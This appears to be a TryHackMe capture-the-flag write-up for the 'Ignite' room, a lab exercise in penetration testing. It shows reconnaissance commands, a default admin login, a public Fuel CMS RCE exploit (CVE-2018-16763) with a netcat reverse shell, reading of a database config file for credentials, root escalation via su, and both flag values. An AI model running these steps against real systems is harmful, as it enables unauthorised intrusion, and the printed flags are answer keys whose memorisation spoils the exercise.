# Ignite — TryHackMe

**Date:** June 2026  
**Difficulty:** Easy  
**Category:** Web, RCE, Reverse Shell, Privilege Escalation  
**Status:** ✅ Completed  

---

# 🔍 Summary

Ignite is an easy TryHackMe room focused on web enumeration, CMS exploitation, reverse shells, and privilege escalation. The objective was to identify a vulnerable Fuel CMS installation, exploit a known remote code execution vulnerability, gain access to the server, and escalate privileges to root using exposed credentials.

---

# 🛠️ Tools Used

- Nmap
- Gobuster
- Fuel CMS Exploit
- Netcat
- PHP Reverse Shell
- Linux Enumeration

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="838" height="621" alt="Screenshot 2026-06-02 232319" src="https://github.com/user-attachments/assets/42dc7adc-6fb8-4cff-9bbc-fac00074415e" />


### Findings

| Port | Service |
|--------|---------|
| 80 | HTTP |

The web server was running Apache 2.4.18 on Ubuntu.

The page title indicated:

```text
Welcome to FUEL CMS
```

---

## Website Enumeration

Browsing the website revealed a Fuel CMS installation.

<img width="2366" height="1338" alt="Screenshot 2026-06-02 232350" src="https://github.com/user-attachments/assets/a7b6f8f2-e2f9-47ee-a1c2-2538edbad5a0" />


The CMS version was identified as:

```text
Fuel CMS 1.4
```

---

## Gobuster Enumeration

```bash
gobuster dir -u http://MACHINE_IP \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 200
```
<img width="1163" height="1235" alt="Screenshot 2026-06-02 233103" src="https://github.com/user-attachments/assets/9cc274a9-76bc-4fb1-89d4-3f46419da37a" />
<img width="1080" height="1230" alt="Screenshot 2026-06-02 233112" src="https://github.com/user-attachments/assets/77f97c26-300f-4f22-a7d1-7623cc3ab251" />


### Directories Found

```text
/fuel
```

The Fuel CMS administrator portal was accessible.

---

## Default Credentials Discovery

While reviewing Fuel CMS documentation, default credentials were identified.

<img width="1599" height="429" alt="Screenshot 2026-06-02 233139" src="https://github.com/user-attachments/assets/a01bfab1-6803-4d2d-a4fa-f92ac3a057cb" />


### Credentials

```text
Username: admin
Password: admin
```

Using these credentials, I successfully authenticated to the Fuel CMS administration portal.

<img width="2356" height="1313" alt="Screenshot 2026-06-02 232630" src="https://github.com/user-attachments/assets/24196248-45e9-4221-8747-1762aee39718" />


---

# 🔓 Exploitation

## Fuel CMS RCE

Fuel CMS 1.4 is vulnerable to:

```text
CVE-2018-16763
```

A public exploit was available.

<img width="2362" height="1214" alt="Screenshot 2026-06-02 233513" src="https://github.com/user-attachments/assets/7e5b342e-9b23-403f-938b-c02a0f09cbbb" />


I downloaded the exploit and executed it.

```bash
python3 exploit_cms_fuel_v_1_4.py MACHINE_IP
```

<img width="513" height="391" alt="Screenshot 2026-06-02 234120" src="https://github.com/user-attachments/assets/0d28d4b7-db2d-4044-b56b-86e0f3fac162" />


---

## Reverse Shell

Started a Netcat listener:

```bash
nc -lvnp 1234
```

The exploit provided a reverse shell connection.

<img width="556" height="487" alt="Screenshot 2026-06-02 234241" src="https://github.com/user-attachments/assets/ccb177bc-35ac-4796-b731-390e5ac788bb" />


Verifying access:

```bash
whoami
```

Output:

```text
www-data
```

---

# 🚩 User Flag

Navigating through the filesystem:

```bash
cd /home
ls
```

The user flag was located and read.

```bash
cat flag.txt
```

Output:

```text
6470e394cbf6dab6a91682cc8585059b
```

---

# ⬆️ Privilege Escalation

## TTY Stabilization

To improve shell usability, I upgraded the reverse shell using:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="2361" height="1277" alt="Screenshot 2026-06-02 234434" src="https://github.com/user-attachments/assets/27a0628c-4295-4722-af3f-a2da1f9366c3" />


---

## Configuration File Enumeration

While exploring the Fuel CMS installation:

```bash
cd /var/www/html/fuel/application/config
```

I inspected:

```bash
cat database.php
```

<img width="1023" height="1242" alt="Screenshot 2026-06-02 235734" src="https://github.com/user-attachments/assets/5953dfc2-d466-4c44-bd44-5f1e82dace96" />

<img width="1023" height="1234" alt="Screenshot 2026-06-02 235752" src="https://github.com/user-attachments/assets/475f3ffb-f6b3-44ab-9e4b-178a1c10ad50" />

Inside the configuration file, database credentials were exposed.

### Credentials Found

```text
Username: root
Password: mememe
```

---

## Root Access

Switching to root:

```bash
su root
```

Password:

```text
mememe
```

Successfully obtained root access.

<img width="577" height="279" alt="Screenshot 2026-06-03 000210" src="https://github.com/user-attachments/assets/48d28876-96ed-42b0-9263-01cb6a168b77" />


---

# 🚩 Root Flag

Reading the root flag:

```bash
cd /root
cat root.txt
```

Output:

```text
b9bbcb33e11b80be759c4e844862482d
```

---
<img width="1571" height="845" alt="Screenshot 2026-06-03 000230" src="https://github.com/user-attachments/assets/552b032b-a061-4ec4-990d-cb4582382eaa" />


# 📚 Lessons Learned

- Practiced web service enumeration
- Identified vulnerable CMS software
- Exploited Fuel CMS RCE (CVE-2018-16763)
- Gained remote code execution through a public exploit
- Established reverse shell access
- Practiced shell stabilization techniques
- Enumerated configuration files for credential discovery
- Learned the dangers of storing plaintext credentials in application configs
- Performed privilege escalation using reused root credentials

---
